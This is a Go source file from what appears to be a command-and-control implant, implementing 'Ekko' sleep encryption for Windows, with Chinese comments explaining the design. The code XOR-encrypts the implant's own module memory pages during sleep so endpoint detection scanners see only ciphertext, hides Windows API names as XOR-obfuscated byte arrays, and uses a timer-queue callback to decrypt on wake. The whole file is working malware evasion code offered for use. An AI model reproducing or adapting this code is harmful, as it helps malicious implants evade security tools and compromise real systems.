//go:build windows

package evasion

import (
	"sync/atomic"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Ekko Sleep Encryption — 休眠期加密agent模块内存，绕过EDR内存扫描
// 原理：Havoc Demon 的 Ekko 技术（Go适配版）
// 1. 获取当前模块的基址和大小
// 2. 只加密模块范围内的 committed 私有内存页（不影响Go runtime堆/栈）
// 3. 定时器唤醒后解密
//
// 与全内存加密的区别：只加密植入体自身的模块页（.text/.data/.rdata等），
// 不加密Go runtime分配的堆和goroutine栈，避免Go调度器在休眠期崩溃

var (
	encCTQTEkko = []byte{0x3C, 0x0D, 0x1A, 0x1E, 0x0B, 0x1A, 0x2B, 0x16, 0x12, 0x1A, 0x0D, 0x2E, 0x0A, 0x1A, 0x0A, 0x1A, 0x2B, 0x16, 0x12, 0x1A, 0x0D} // CreateTimerQueueTimer
	encWFSOEkko = []byte{0x28, 0x1E, 0x16, 0x0B, 0x39, 0x10, 0x0D, 0x2C, 0x16, 0x11, 0x18, 0x13, 0x1A, 0x30, 0x1D, 0x15, 0x1A, 0x1C, 0x0B}             // WaitForSingleObject
	encCTEEkko  = []byte{0x3C, 0x0D, 0x1A, 0x1E, 0x0B, 0x1A, 0x3A, 0x09, 0x1A, 0x11, 0x0B}                                                             // CreateEvent
	encGMHA     = []byte{0x38, 0x1A, 0x0B, 0x32, 0x10, 0x1B, 0x0A, 0x13, 0x1A, 0x37, 0x1E, 0x11, 0x1B, 0x13, 0x1A, 0x3E}                               // GetModuleHandleA
)

var (
	ekkoEncKey byte
	ekkoPages  []ekkoPageInfo
	ekkoWoken  uint32
)

type ekkoPageInfo struct {
	addr       uintptr
	size       uintptr
	oldProtect uint32
}

// EkkoSleep 休眠期间加密植入体模块内存
// 此函数阻塞 duration，期间模块内存被XOR加密，EDR扫描器只能看到密文
func EkkoSleep(d time.Duration) {
	if d <= 0 {
		return
	}

	// 1. 获取当前模块基址和大小
	modBase, modSize := getModuleRange()
	if modBase == 0 || modSize == 0 {
		time.Sleep(d) // fallback
		return
	}

	// 2. 生成随机加密密钥
	ekkoEncKey = byte(time.Now().UnixNano() & 0xFF)
	if ekkoEncKey == 0 {
		ekkoEncKey = 0xAA
	}

	// 3. 加密模块内存页
	encryptModulePages(modBase, modSize)

	// 4. Timer Queue 唤醒
	k32 := windows.NewLazySystemDLL(xorDec(encK32Sleep, xk))
	createTimerQueueTimer := k32.NewProc(xorDec(encCTQTEkko, xk))
	waitForSingleObject := k32.NewProc(xorDec(encWFSOEkko, xk))
	createEvent := k32.NewProc(xorDec(encCTEEkko, xk))

	atomic.StoreUint32(&ekkoWoken, 0)
	event, _, _ := createEvent.Call(0, 0, 0, 0)

	callback := windows.NewCallback(func(param uintptr, timerOrWaitFired byte) uintptr {
		decryptModulePages()
		windows.SetEvent(windows.Handle(event))
		atomic.StoreUint32(&ekkoWoken, 1)
		return 0
	})

	var timer uintptr
	createTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&timer)),
		0,
		callback,
		0,
		uintptr(d.Milliseconds()),
		0,
		0,
	)

	// 5. 等待唤醒
	waitForSingleObject.Call(event, 0xFFFFFFFF)
	windows.CloseHandle(windows.Handle(event))

	// 6. double check解密
	if atomic.LoadUint32(&ekkoWoken) == 0 {
		decryptModulePages()
	}
}

// getModuleRange 获取当前进程主模块的基址和大小
func getModuleRange() (base uintptr, size uintptr) {
	k32 := windows.NewLazySystemDLL(xorDec(encK32Sleep, xk))
	proc := k32.NewProc(xorDec(encGMHA, xk))
	hMod, _, _ := proc.Call(0) // GetModuleHandleA(NULL)
	if hMod == 0 {
		return 0, 0
	}
	base = hMod

	// 解析PE头获取ImageSize
	peHeaderOffset := *(*uint32)(unsafe.Pointer(base + 0x3C))
	optHeader := base + uintptr(peHeaderOffset) + 4 + 20 // PE sig(4) + FileHeader(20)
	// ImageSize 在 OptionalHeader 的偏移 56 (PE32+) 或 56 (PE32)
	// 对于 PE32+: SizeOfImage 在 OptionalHeader + 0x38
	magic := *(*uint16)(unsafe.Pointer(optHeader))
	var imageSizeOffset uintptr
	if magic == 0x20B { // PE32+
		imageSizeOffset = 0x38
	} else {
		imageSizeOffset = 0x38 // PE32 也是 0x38
	}
	size = uintptr(*(*uint32)(unsafe.Pointer(optHeader + imageSizeOffset)))

	return base, size
}

// encryptModulePages 加密模块范围内的所有 committed 私有内存页
func encryptModulePages(modBase, modSize uintptr) {
	ekkoPages = ekkoPages[:0]

	addr := modBase
	end := modBase + modSize

	for addr < end {
		var mbi windows.MemoryBasicInformation
		ret, _, _ := windows.NewLazySystemDLL(xorDec(encNTDll, xk)).NewProc("NtQueryVirtualMemory").Call(
			uintptr(0xFFFFFFFFFFFFFFFF),
			addr,
			0,
			uintptr(unsafe.Pointer(&mbi)),
			unsafe.Sizeof(mbi),
			0,
		)
		if ret != 0 {
			break
		}

		if mbi.State == windows.MEM_COMMIT &&
			mbi.RegionSize > 0 &&
			mbi.BaseAddress >= modBase &&
			mbi.BaseAddress < end {

			// 跳过可执行页（.text），只加密数据页
			// 加密 .text 会导致 timer callback 等代码执行时崩溃
			if mbi.Protect&0xF0 != 0 {
				addr = mbi.BaseAddress + mbi.RegionSize
				continue
			}

			regionAddr := mbi.BaseAddress
			regionSize := mbi.RegionSize

			// 裁剪到模块范围
			if regionAddr < modBase {
				diff := modBase - regionAddr
				regionAddr = modBase
				regionSize -= diff
			}
			if regionAddr+regionSize > end {
				regionSize = end - regionAddr
			}

			page := ekkoPageInfo{
				addr:       regionAddr,
				size:       regionSize,
				oldProtect: mbi.Protect,
			}

			var oldProtect uint32
			windows.VirtualProtect(regionAddr, regionSize, windows.PAGE_READWRITE, &oldProtect)

			data := unsafe.Slice((*byte)(unsafe.Pointer(regionAddr)), regionSize)
			for i := range data {
				data[i] ^= ekkoEncKey
			}

			windows.VirtualProtect(regionAddr, regionSize, mbi.Protect, &oldProtect)
			ekkoPages = append(ekkoPages, page)
		}

		addr = mbi.BaseAddress + mbi.RegionSize
	}
}

// decryptModulePages 解密所有加密的模块内存页
func decryptModulePages() {
	for _, page := range ekkoPages {
		var oldProtect uint32
		windows.VirtualProtect(page.addr, page.size, windows.PAGE_READWRITE, &oldProtect)

		data := unsafe.Slice((*byte)(unsafe.Pointer(page.addr)), page.size)
		for i := range data {
			data[i] ^= ekkoEncKey
		}

		windows.VirtualProtect(page.addr, page.size, page.oldProtect, &oldProtect)
	}
	ekkoPages = ekkoPages[:0]
}
